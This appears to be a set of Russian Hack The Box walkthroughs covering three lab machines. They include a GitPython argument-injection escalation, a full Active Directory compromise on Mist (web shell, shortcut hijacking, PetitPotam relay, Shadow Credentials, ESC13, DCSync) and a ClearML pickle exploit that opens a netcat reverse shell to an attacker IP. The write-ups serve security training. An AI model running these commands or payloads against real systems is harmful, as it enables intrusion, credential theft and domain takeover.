тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и начнем сканирование. Затем смотрим, что интересного он нашел.
  В каталоге /opt есть два проекта: apps и internal_apps.





                        Содержимое каталога /opt

Из файла с настройками веб‑сервера Nginx узнаём о Unix-сокете editorial.
sock в проекте /opt/apps.





                              Конфиги PHP

В каталоге /home/dev/apps есть репозиторий Git.





                           Найденные файлы .git

Для удобного анализа Git-репозитория заархивируем каталог /home/dev/
apps и скачаем его на свою машину.


zip -r apps.zip apps


scp dev@10.10.11.20:/home/dev/apps.zip ./

Затем я открыл каталог в Visual Studio Code и посмотрел историю коммитов.





                   История коммитов в репозитории apps

В одном из коммитов есть всего одно изменение: в сообщении вместо учет‐
ных данных записи prod записаны учетные данные для пользователя dev.





                          Изменения в файле

Используем  учетную  запись  prod  для  смены  контекста  безопасности
и получаем сессию нового пользователя.





                        Сессия пользователя prod


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Разведку мы уже проводили, поэтому при изменении контекста снова все
проверять не нужно. Посмотрим только самое важное. Одно из мест, куда
стоит заглянуть первым делом, — это файл sudoers.

Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.





                               Настройки sudoers

Таким   образом,   можно   выполнить   скрипт   /opt/internal_apps/
clone_changes/clone_prod_change.py  от   имени   пользователя   root.
При этом скрипту можно передать какие‑то параметры. Просмотрим его
исходный код.





                Содержимое файла clone_prod_change.py

В самом коде ничего интересного найти не удалось. Однако есть импорт
из пакета git. Часто в таких случаях можно обнаружить, что используются
старые библиотеки, в которых есть известные уязвимости. Давай посмотрим,
какая библиотека здесь.





                         Определение библиотеки

Google выводит нас на библиотеку GitPython. Поищем эксплоиты для нее.





                         Поиск эксплоитов в Google

Версии GitPython меньше 3.1.35 уязвимы к CVE-2022-24439 — внедрению
кода за счет внешнего вызова Git без достаточной очистки входных аргумен‐
тов. Проверим, какая версия библиотеки используется на сервере.





                           Версии pip-пакетов

На сервере — GitPython 3.1.29, а значит, мы можем внедрить свой код,
который будет выполнен в привилегированном контексте. Как это сделать,
можно подсмотреть на GitHub.





                         Описание уязвимости

В качестве выполняемого кода будем использовать скрипт exp.sh, который
установит файлу командной оболочки /bin/bash бит SUID.


#!/bin/bash
chmod u+s /bin/bash

Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.


Эксплуатируем уязвимость и после кучи ошибок проверяем права на бинар‐
ник bash.


sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_
change.py "ext::sh -c '/tmp/exp.sh'"





                             Эксплуатация уязвимости





                           Флаг рута

Все получилось, машина захвачена!
ВЗЛОМ





Сегодня я покажу ряд атак ESC13 на службу
сертификации Active Directory, в результате
которых мы  захватим  домен  Windows.
На пути к этому придется решить еще нес‐
колько проблем: получить сессию на хосте             RalfHacker                                                                                             hackerralf8@gmail.com
через  уязвимый  веб‑сервис,  подменить
ярлык, вскрыть хеш пароля при помощи
UnPAC the hash, использовать принудитель‐
ную  аутентификацию  и   атаку  Shadow
Credentials и применить другие техники атак
на AD.


Наша цель — получение прав суперпользователя на машине Mist с учебной
площадки Hack The Box. Уровень сложности задания — «безумный».


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.17    mist.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер обнаружил всего один открытый порт: 80 — веб‑сервер Apache
2.4.52. На сайте нас ожидает система Pluck 4.7.18.





                           Главная страница сайта


ТОЧКА ВХОДА

При попытке перейти к управлению в системе нас встретит форма аутен‐
тификации.





                       Форма аутентификации

Первым делом стоит проверить, есть ли для обнаруженной CMS готовые экс‐
плоиты. Идем за ними прямиком в Google.





                         Поиск эксплоитов в Google

Обнаруживаем, что в этой версии Pluck есть возможность разместить
веб‑шелл через загрузку модуля и тем самым получить RCE. Но проблема
в том, что сперва нужно получить доступ к управлению веб‑приложением.
   Так как версия приложения не самая новая, переходим к поиску других
эксплоитов. В модуле albums в функции получения изображений есть уяз‐
вимость обхода каталога, что позволит нам получить содержимое любого
файла.





                         Описание уязвимости

Но пример из PoC не сработал, запрос был заблокирован.





                        Сообщение о блокировке

Посмотрим, какие еще есть интересные модули и файлы. Для этого прос‐
канируем каталоги с помощью feroxbuster. При запуске используем сле‐
дующие параметры:
 • -u — URL;
 • -d — глубина сканирования.


feroxbuster -u http://mist.htb/ -d 2





                        Результат сканирования каталогов

Пройдемся по найденным каталогам и заметим, что директория /data/
settings/modules/albums не индексируется и мы можем получить доступ
ко всем файлам внутри нее.





                      Содержимое каталога albums

Теперь используем найденную ранее уязвимость LFI для чтения содержимого
файла admin_backup.php.





                  Содержимое файла admin_backup.php

В файле есть какой‑то хеш, попробуем его подобрать.


ТОЧКА ОПОРЫ

Брутить хеш будем с помощью hashcat. У него есть возможность автомати‐
ческого определения типа хеша, поэтому передаем ему только хеш и словарь
для перебора. Но под этот формат подходит несколько алгоритмов, о чем
утилита нам и сообщит.


hashcat 'c81dd.....ce81e' rockyou.txt





                             Вывод hashcat

Из представленных алгоритмов наиболее популярен SHA2-512. При пов‐
торном запуске hashcat добавим номер алгоритма в параметре -m.


hashcat -m 1700 'c81dd.....ce81e' rockyou.txt




                             Результат подбора пароля

С этим паролем можно авторизоваться в системе Pluck и попробовать
получить RCE через загрузку собственного модуля.





                           Главная страница Pluck

Переходим      на       страницу      http://10.10.11.17/admin.php?
action=installmodule и загружаем архив pwn123.zip, который содержит
p0wny-shell. Даем ему название pwn123.php. Затем переходим к странице
загруженного модуля:


http://10.10.11.17/data/modules/pwn123/pwn123.php

И нас встречает PHP-шелл.





                          Страница p0wny-shell


ПРОДВИЖЕНИЕ

Так как через веб‑шелл работать неудобно, я воспользовался C2-фреймвор‐
ком Havoc.



                            Сессия в C2 Havoc

Следующим шагом нам нужно собрать информацию. Я буду использовать
для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на хост исполняемый файл для Windows и запустим сканирование.
Вывод утилиты будем сохранять в файл.


WinPEAS.exe > wp.txt

Спустя несколько минут командой download скачиваем файл с собранной
информацией и просматриваем его на своем компьютере. Там будет много
всего, попробуем выделить только то, что нам поможет в продвижении.
  В систему выполнили вход три пользователя.





                    Список залогиненных пользователей

В кеше DNS находим запись о контроллере домена dc01 (192.168.100.100).





                         Кеш DNS

На хосте есть доступные сетевые ресурсы.





                      Общие сетевые ресурсы

Больше  всего  нас  должен  заинтересовать общий  каталог  C:\Common
Applications, так как это не дефолтная настройка. Просмотрим содержимое
этой директории.





              Содержимое каталога C:\Common Applications

В общем каталоге — несколько ярлыков, а у нас есть право на запись. Стан‐
дартная практика в такой ситуации — поменять ярлык так, чтобы он выполнял
нужные нам команды, например запуск агента Havoc.


powershell "$objShell = New-Object -ComObject WScript.Shell ; $lnk =
$objShell.CreateShortcut('C:\Common Applications\Calculator.lnk') ;
$lnk.TargetPath = 'C:\xampp\htdocs\files\a.exe' ; $lnk.Save()"


powershell "$objShell = New-Object -ComObject WScript.Shell ; $lnk =
$objShell.CreateShortcut('C:\Common Applications\Notepad.lnk') ; $lnk
.TargetPath = 'C:\xampp\htdocs\files\a.exe' ; $lnk.Save()"


powershell "$objShell = New-Object -ComObject WScript.Shell ; $lnk =
$objShell.CreateShortcut('C:\Common Applications\Wordpad.lnk') ; $lnk
.TargetPath = 'C:\xampp\htdocs\files\a.exe' ; $lnk.Save()"

И   спустя  пару  минут  получаем  сессию  от  имени   пользователя
Brandon.Keywarp.





                          Информация о сессии


Пользователь Brandon.Keywarp
Теперь, когда мы получили сессию доменного пользователя, можно собрать
информацию  в  домене.  Лучше  всего  для  этого  подходит  инструмент
BloodHound. Запускать бинари .NET в памяти агента Havoc можно командой
dotnet inline-execute.


dotnet inline-execute SharpHound.exe -c All --domaincontroller 192.
168.100.100

Построив граф BloodHound от текущего пользователя, можно найти в сети
центр сертификации Active Directory.





                       Граф BloodHound




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
           HTB MIST
       ИСПОЛЬЗУЕМ ТЕХНИКУ ESC13 ДЛЯ
                ЗАХВАТА ДОМЕНА ACTIVE
                           DIRECTORY




Так как в домене есть ADCS, а сессию пользователя мы получили без исполь‐
зования каких‑либо учетных данных, нам стоит задействовать технику UnPAC
the hash, чтобы выяснить NTLM-хеш пароля пользователя. Первом делом
запустим утилиту Certify, чтобы запросить сертификат пользователя.


dotnet inline-execute /home/ralf/tmp/SharpCollection/last/Certify.exe
 request /ca:DC01.mist.htb\mist-DC01-CA /template:User





                    Получение сертификата пользователя

Сертификат представлен в формате PEM. Копируем его на свою машину
и конвертируем в формат PFX.


openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced
Cryptographic Provider v1.0" -export -out cert.pfx

А теперь с помощью Rubeus по сертификату пользователя запрашиваем
билет TGT и извлекаем из него NTLM-хеш пароля пользователя (параметр
getcredentials).       Сертификат      необходимо       закодировать
в Base64 и передать в параметре certificate.


.\Rubeus.exe asktgt /user:brandon.keywarp /certificate:..... /
getcredentials /show /nowrap





                            Получение NTLM-хеша

Валидировать полученную учетку можно с помощью NetExec. Так как трафик
необходимо туннелировать, предварительно в агенте Havoc командой socks
add 1080 запустим сервер Socks5. В файле /etc/proxychains.conf про‐
пишем настройку socks5 127.0.0.1 1080. Так с помощью proxychains можно
туннелировать трафик через агент Havoc во внутреннюю сеть.


proxychains -q nxc smb 192.168.100.101 -u brandon.keywarp -H
DB03D6A77A2205BC1D07082740626CC9



                           Проверка учетных данных

Затем таким же образом проверим подпись LDAP в домене. В этом поможет
модуль ldap-checker для команды ldap.


proxychains -q nxc ldap dc01.mist.htb -u brandon.keywarp -H
DB03D6A77A2205BC1D07082740626CC9 -M ldap-checker




                            Проверка подписи LDAP

Подпись LDAP в домене не требуется, а значит, будем проверять методы
принудительной аутентификации для потенциального выполнения ретрансля‐
ционных атак. Запускаем Responder и используем PetitPotam для принуди‐
тельной аутентификации с сервера MS01 на нашем листенере.


proxychains -q python3 PetitPotam.py -u 'brandon.keywarp' -d mist.
htb -hashes ':db03d6a77a2205bc1d07082740626cc9' 10.10.14.8 192.168.
100.101 -pipe all





                 Полученный NetNTLMv2-хеш в респондере

На Responder прилетает хеш, а значит, сервер уязвим к PetitPotam.


NTLM Relay
Первая идея — это релей хеша на LDAP для выполнения ShadowCreds и ком‐
прометации хоста. Но для этого хеш должен быть не с SMB, так как там
используется  подпись,  а  с  HTTP.  Для  этого  с  помощью  утилиты
SharpStartWebclient  активируем на  хосте WebDAV.  Проверить работу
WebDAV можно через GetWebDAVStatus.


shell GetWebDAVStatus.exe 192.168.100.101


shell SharpStartWebclient.exe





                             Активация WebDAV

Теперь для эксплуатации PetitPotam c HTTP необходимо сделать надежный
туннель. Для этого я использовал тулзу Socat. Загружаем архив на удаленный
хост и распаковываем с помощью PowerShell.


Expand-Archive -Path C:\xampp\htdocs\files\socat.zip -DestinationPath
 C:\xampp\htdocs\files\

Будем    туннелировать   весь    трафик   с    порта   5432   сервера
MS01 на порт 80 нашей атакующей машины.


shell socat.exe tcp-listen:5432,reuseaddr,fork tcp:10.10.14.8:80

Почти все готово для атаки, осталось настроить редиректор ntlmrelayx.
Для эксплуатации ShadowCreds будем использовать форк impacket поль‐
зователя fortra.


pip3 install pyOpenSSL==24.0.0
proxychains -q ntlmrelayx.py -t ldaps://dc01.mist.htb -smb2support
-domain mist.htb --http-port 8888 --no-smb -i

Теперь снова запускаем PetitPotam и в качестве машины для аутентификации
указываем MS01@5432.


proxychains -q python3 PetitPotam.py -u 'brandon.keywarp' -d mist.
htb -hashes ':db03d6a77a2205bc1d07082740626cc9' -pipe all 'MS01@5432/
ralf' '192.168.100.101'

Сервер пройдет аутентификацию по HTTP, трафик будет туннелирован через
Socat на редиректор ntlmrelayx, откуда через Socks трафик Havoc будет тун‐
нелирован службе LDAP на контроллере домена.





                  Выполнение релей‑атаки с HTTP на LDAP

Атака проведена успешно, можем подключиться к интерактивному LDAP-шел‐
лу и использовать технику ShadowCreds для формирования сертификата,
который мы повесим на учетную запись машины MS01.


nc 127.0.0.1 11000


clear_shadow_creds MS01$
set_shadow_creds MS01$





                         Выполнение ShadowCreds

Теперь снимем пароль с сертификата и через технику UnPAC the hash по сер‐
тификату машинной учетной записи получим ее NTLM-хеш.


certipy cert -export -pfx '87A0bfVH.pfx' -password
'oNOsPXtyUUkIkyCHgY0b' -out ms01.pfx


proxychains -q certipy auth -pfx ms01.pfx -domain mist.htb -username
'MS01$' -dc-ip 192.168.100.100 -ns 192.168.100.100





                   Хеш пароля пользователя

Используя NTLM-хеш машинной учетной записи, мы можем при помощи инс‐
трумента Rubeus запросить для нее билет TGT, а затем c этим билетом через
расширение S4U получить билет TGS для любой службы, работающей от име‐
ни машинной учетной записи, на имя любого пользователя домена. Будем
получать тикет администратора для службы CIFS.


dotnet inline-execute Rubeus.exe asktgt /nowrap /user:ms01$ /domain:
mist.htb /rc4:6c8836240c39914164ee3d85fe4bf352 /nowrap





                           Получение TGT для MS01$


dotnet inline-execute Rubeus.exe s4u /self /impersonateuser:
Administrator /altservice:"cifs/ms01.mist.htb" /ticket:doIFLDC.....
C5odGI= /nowrap





                        Получение TGS для Administrator

Благодаря технике AnySPN мы можем использовать полученный TGS для дос‐
тупа к любой службе на хосте, а не только CIFS. Утилитой RubeusToCcache
сконвертируем его на локальной машине в формат ccache и сдампим учет‐
ные данные с хоста MS01.


python3 rubeustoccache.py 'doIF2.....5odGI=' ms01.kirbi ms01.ccache


KRB5CCNAME=/ms01.ccache proxychains -q impacket-secretsdump 'mist.
htb/Administrator'@ms01.mist.htb -k -no-pass





                  Содержимое базы SAM на хосте MS01

С хешем локального администратора получаем управление через службу
WinRM и читаем первый флаг.


proxychains -q evil-winrm -i 192.168.100.101 -u Administrator -H
711e6a685af1c31c4029c3c7681dd97b





                       Флаг пользователя


Пользователь OP_SHARON.MULLARD
Запускаем на хосте агент Havoc от имени администратора и просматриваем
файловую систему. В папке Users находим домашний каталог пользователя
Sharon.Mullard.





                      Содержимое каталога C:\Users

Заглянув  туда, находим в  папке Documents базы менеджера паролей
KeePass, а также две картинки в каталоге My Pictures.





                    Содержимое каталога Documents





                    Содержимое каталога My Pictures

Скачиваем файлы на локальную машину. На первой картинке изображены
обычные коты, а вот на второй скриншот с TODO, запросы в Google и часть
ключа.





                           Скачанные изображения

Видимо, изображение с котами тоже может быть ключевой информацией
для базы KeePass. При этом на скриншоте с паролем мы можем узнать пер‐
вые 14 символов, а над словом Output видим длину полного пароля — 15.
Попробуем подобрать единственный неизвестный символ. Первым делом c
помощью keepass2john извлечем хеш пароля, а затем по маске подберем
недостающий символ.




                                Получение хеша


hashcat -a 3 -m 13400 keepass_hash.txt 'UA7cpa[#1!_*ZX?'





                         Пароль для базы KeePass

Открываем базу и получаем пароль еще одного пользователя домена.





                       Содержимое базы KeePass

Из базы BloodHound узнаём, что у пользователя есть несколько учетных
записей. Судя по подсказке operative account из KeePass, скорее всего,
пароль имеет отношение к аккаунту OP_SHARON.MULLARD.





                         Поиск по базе BloodHound

Для точности валидируем пароль с помощью NetExec.


proxychains -q nxc smb 192.168.100.101 -d mist.htb -u 'OP_SHARON.
MULLARD' -p 'ImTiredOfThisJob:('


proxychains -q nxc smb 192.168.100.101 -d mist.htb -u 'SHARON.
MULLARD' -p 'ImTiredOfThisJob:('





                           Проверка учетных данных

Таким образом, мы компрометируем еще одну учетную запись.


Группа Certificate Managers
Возвращаемся  к BloodHound и  перестраиваем граф  от  пользователя
OP_SHARON.MULLARD.
   Пользователь входит в группу OPERATIVES, которая имеет право чтения
пароля управляемой учетной записи SVC_CA$.





                       Граф BloodHound




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
           HTB MIST
       ИСПОЛЬЗУЕМ ТЕХНИКУ ESC13 ДЛЯ
                ЗАХВАТА ДОМЕНА ACTIVE
                           DIRECTORY




SVC_CA$, в свою очередь, входит в группу Certificate Services. Члены этой
группы     могут     запрашивать     сертификаты     для     шаблона
ManagerAuthentication и имеют право AddKeyCredentialLink на учетную
запись Svc_CaBackup.





                       Граф BloodHound

Svc_CaBackup может лишь запросить сертификат по тому же шаблону
ManagerAuthentication.





                       Граф BloodHound

Вернемся к управляемой учетной записи SVC_CA$.


Справка: управляемые учетные записи
Управляемые учетные записи (MSA) — это специальный тип учетных записей
Active Directory, которые можно использовать для безопасного запуска служб,
приложений и заданий планировщика. Основная их идея в том, что паролем
таких учетных записей полностью управляет Active Directory. Для них авто‐
матически генерируется сложный пароль длиной 240 символов, который
меняется автоматически каждые 30 дней. Для аутентификации используется
только Kerberos, так как интерактивный вход невозможен. Это связано с тем,
что пароль не известен никому и не хранится в локальной системе, поэтому
его нельзя извлечь из системного процесса LSASS с помощью Mimikatz.


Получить хеши паролей MSA можно с помощью модуля gmsa для NetExec.


proxychains -q nxc ldap dc01.mist.htb -d mist.htb -u 'OP_SHARON.
MULLARD' -p 'ImTiredOfThisJob:(' --gmsa




                     Хеш пароля svc_ca$

Теперь,  воспользовавшись  правом  AddKeyCredentialLink  на  учетную
запись Svc_CaBackup, проведем атаку Shadow Credentials. Это позволит нам
получить хеш пароля учетной записи Svc_CaBackup.


proxychains -q certipy shadow auto -username 'svc_ca$@mist.htb'
-hashes :510b6e5c88b2282cea97e68d5185b4a4 -account svc_cabackup
-dc-ip 192.168.100.100





                           Эксплуатация ShadowCreds

Таким образом, мы скомпрометировали еще две учетные записи.


ESC13
Теперь построим граф от группы Certificate Services и увидим интересные
связи.  Члены  этой  группы  могут  получить  сертификат  по  шаблону
ManagerAuthentication.  Этот  шаблон  настроен  с помощью  политики
ManagerIssuance, связанной через OID Group Link с группой  Certificate
Managers.





                       Граф BloodHound

Группа Certificate Managers входит в другую группу — CA Backup, члены
которой могут получить сертификат по шаблону BackupSvcAuthentication.
Это шаблон настроен с помощью политики Backup Policy, связанной через
OID Group Link с группой Service Accounts.





                       Граф BloodHound





                       Граф BloodHound

Техника эксплуатации, известная как ADCS ESC13, позволяет злоумышленни‐
ку получить доступ к ресурсам корпоративной сети при определенных усло‐
виях. У пользователя или компьютера должны быть права на регистрацию
сертификата по шаблону, который настроен с использованием политики
выдачи, содержащей OID Group Link — идентификатор, связывающий сер‐
тификат с конкретной группой пользователей.
   Если пользователь или компьютер, обладающий такими правами, регис‐
трирует сертификат по этому шаблону, то сертификат будет связывать его
с определенной группой, указанной в OID Group Link. Это позволяет зло‐
умышленнику, получившему доступ к такому сертификату, входить в сеть
с привилегиями члена группы, даже если он не является ее реальным учас‐
тником.
   Будучи членом группы Certificate Services, мы можем получить сертификат
по шаблону ManagerAuthentication. Тогда при аутентификации по этому
сертификату сервис будет воспринимать нас как члена группы Certificate
Managers, хотя фактически мы в ней не состоим.
   Перед эксплуатацией обновим запись в файле /etc/hosts.


192.168.100.100 dc01.mist.htb mist.htb mist-DC01-CA

А теперь запросим сертификат по шаблону ManagerAuthentication от име‐
ни пользователя Svc_CaBackup.


proxychains -q certipy req -u 'svc_cabackup@mist.htb' -hashes :
c9872f1bc10bdd522c12fc2ac9041b64 -dc-ip 192.168.100.100 -dns 192.168.
100.100 -dns-tcp -ca mist-DC01-CA -target DC01.mist.htb -template
ManagerAuthentication -key-size 4096 -out ~/tmp/HTB/mist/
ManagerAuthentication





                Получение сертификата ManagerAuthentication

Теперь по сертификату получим TGT-билет пользователя. Так как в TGT будет
идентификатор группы Certificate Managers, запросим сертификат по шаб‐
лону BackupSvcAuthentication.


proxychains -q certipy auth -pfx /home/ralf/tmp/HTB/mist/
ManagerAuthentication.pfx -dc-ip 192.168.100.100


KRB5CCNAME=svc_cabackup.ccache proxychains -q certipy req -u
'svc_cabackup@mist.htb' -k -no-pass -dc-ip 192.168.100.100 -dns 192.
168.100.100 -dns-tcp -ca mist-DC01-CA -target DC01.mist.htb -template
'BackupSvcAuthentication' -key-size 4096 -out ~/tmp/HTB/mist/
BackupSvcAuthentication





               Получение сертификата BackupSvcAuthentication

Теперь у нас есть сертификат, по которому мы можем аутентифицироваться
как член группы Service Accounts.


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

С помощью скрипта Certipy снова получаем тикет TGT по сертификату.


proxychains -q certipy auth -pfx /home/ralf/tmp/HTB/mist/
BackupSvcAuthentication.pfx -dc-ip 192.168.100.100





                                Получение TGT

Теперь у нас есть билет, который содержит RID группы ServiceAccounts.
Члены этой группы имеют право на дамп системных ключей реестра. Нас,
конечно же, будут интересовать ключи SAM, SECURITY и SYSTEM, так как они
содержат данные не только локальных учетных записей, но и системы.
   Сдампить  ключи  реестра  удаленно  позволяет скрипт impacket-reg.
Но если дамп сохранится на удаленной машине, мы не сможем до него
дотянуться. Поэтому с помощью impacket-smbserver откроем свой SMB-
ресурс и сохраним дампы на нем.


sudo smbserver.py -smb2support share .


KRB5CCNAME=svc_cabackup.ccache proxychains -q reg.py 'mist.htb/
svc_cabackup@dc01.mist.htb' -k -no-pass -dc-ip 192.168.100.100 save
-keyName 'HKLM\SAM' -o '\\10.10.14.45\share'
KRB5CCNAME=svc_cabackup.ccache proxychains -q reg.py 'mist.htb/
svc_cabackup@dc01.mist.htb' -k -no-pass -dc-ip 192.168.100.100 save
-keyName 'HKLM\SECURITY' -o '\\10.10.14.45\share'
KRB5CCNAME=svc_cabackup.ccache proxychains -q reg.py 'mist.htb/
svc_cabackup@dc01.mist.htb' -k -no-pass -dc-ip 192.168.100.100 save
-keyName 'HKLM\SYSTEM' -o '\\10.10.14.45\share'




                     Дамп ключей реестра





                               Логи SMB-сервера

Когда дамп уже у нас, распарсим его через impacket-secretsdump.


secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.
save LOCAL





                            Учетные данные DC01

Так мы получаем хеш пароля машинной учетной записи контроллера домена,
у которой есть  право репликации  учетных  данных. Выполняем DCSync
для получения хеша пароля администратора домена.


proxychains -q secretsdump.py 'mist.htb/DC01$'@192.168.100.100
-hashes :e768c4cf883a87ba9e96278990292260 -just-dc-user Administrator





                           Результат выполнения DCSync

С полученными учетными данными подключаемся к контроллеру домена
по WinRM и забираем второй флаг.


proxychains -q evil-winrm -i 192.168.100.100 -u Administrator -H
b46782b9365344abdff1a925601e0385





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я покажу эксплуатацию свежего
бага в платформе для управления  ней‐
росетями ClearML. Эта  уязвимость  поз‐
волит нам получить возможность удален‐
ного  выполнения  команд  на  сервере.             RalfHacker                                                                                             hackerralf8@gmail.com
А затем заюзаем уязвимый импорт в прог‐
рамме на Python и повысим привилегии
в Linux.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.19     blurry.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Нашлось всего два открытых порта:
 • 22 — служба OpenSSH 8.4p1;
 • 80 — веб‑сервер Nginx 1.18.0.

В логах Nmap также видно, что с 80-го порта выполняется редирект на сайт
http://app.blurry.htb. Добавим новый поддомен в файл /etc/hosts
и просмотрим сайт в браузере.


10.10.11.19 blurry.htb app.blurry.htb





                    Главная страница сайта app.blurry.htb

Нас встречает сервис ClearML.


ТОЧКА ВХОДА

ClearML — это фреймворк для трекинга ML-экспериментов, позволяющий
отслеживать метрики машинного обучения, хранить и предоставлять по зап‐
росу модели, воспроизводить эксперименты и визуализировать результаты.
Вводим любое имя и получаем доступ к панели ClearML.





                           Главная панель ClearML

Первым делом определяем версию фреймворка. Обычно ее можно найти
на странице с настройками, в разделе описания или в профиле пользователя.
В случае с ClearML подошел третий вариант.





                           Версия фреймворка

Наша версия — 1.13. Проверим, есть ли для нее готовые эксплоиты.





                         Поиск эксплоитов в Google

Первая же ссылка из Google выводит нас на CVE-2024-24590.


ТОЧКА ОПОРЫ

В ClearML используется пакет ClearML для Python, через который происходит
взаимодействие с сервером по API. Этот пакет использует встроенный
в Python модуль Pickle, отвечающий за сериализацию и десериализацию объ‐
ектов. Атакующий может создать файл Pickle, содержащий произвольный код,
и загрузить его в качестве артефакта в проект через API. Затем при вызове
метода get класса Artifact файл .pkl будет десериализован, что приведет
к выполнению заложенного кода.
   Чтобы воспроизвести эту атаку, нам нужно настроить ClearML локально.
Для этого сперва получим конфиг в меню Settings → Workspace → Create new
credentials.





                           Страница Workspace





                         Конфиг для подключения

В конфиге есть новые поддомены, поэтому обновляем запись в файле /etc/
hosts.


10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb api.blurry.htb

Так как будем работать с ClearML на своей машине, сперва нужно установить
необходимые пакеты.


pip install clearml

А теперь настроим ClearML. Для этого запустим clearml-init и при запросе
учетных данных вставим весь полученный конфиг.


api {
    web_server: http://app.blurry.htb
    api_server: http://api.blurry.htb
    files_server: http://files.blurry.htb
    credentials {
        "access_key" = "9ZJL1UC8DOP3UJJRUJBM"
        "secret_key"  =
"fLPHiGutlDvkULEQlo65XlP5azqSvVTlXW7yeKJGf4rjOzAEb4"
    }
}





                          Подключение к ClearML

Для эксплуатации уязвимости воспользуемся эксплоитом, который выполнит
реверс‑шелл.


from clearml import Task
import pickle, os


class RunCommand:
   def __reduce__(self):
       return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i
2>&1|nc 10.10.16.73 4321 >/tmp/f',))


command = RunCommand()


task = Task.init(project_name='Black Swan', task_name='
pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command,
retries=2, wait_on_upload=True, extension_name=".pkl")

Запустим листенер:


rlwrap nc -nlvp 4321

И выполним код.




                             Эксплуатация уязвимости





                            Страница проекта

Однако код не выполняется. Нам нужно подгадать момент, когда поль‐
зователь начинает работать с проектом. Если запустить эксплоит в это время,
он сработает и мы получим сессию на наш листенер.





                            Страница проекта





                 Выполнение эксплоита и получение сессии

У нас есть сессия пользователя jippity, и мы можем забрать первый флаг.



                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Теперь нам необходимо собрать информацию. Я буду использовать для это‐
го скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. В выводе будет много информации, пройдемся
по важным моментам.
   У текущего пользователя сохранен приватный SSH-ключ /home/jippity/.
ssh/id_rsa.





                      SSH-ключ пользователя

Для группы текущего пользователя доступна запись в каталог /models.





                      Каталоги, доступные для записи группе

В  sudoers  есть  запись,  позволяющая  запустить  команду  /usr/bin/
evaluate_model  /models/*.pth с  высокими  привилегиями без  ввода
пароля.

Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.





                               Настройки sudoers

Сохраняем ключ SSH на свою машину, назначаем права chmod 0600 id_rsa
и подключаемся по SSH. Так мы получим стабильную полноценную коман‐
дную оболочку.


ssh -i id_rsa jippity@blurry.htb

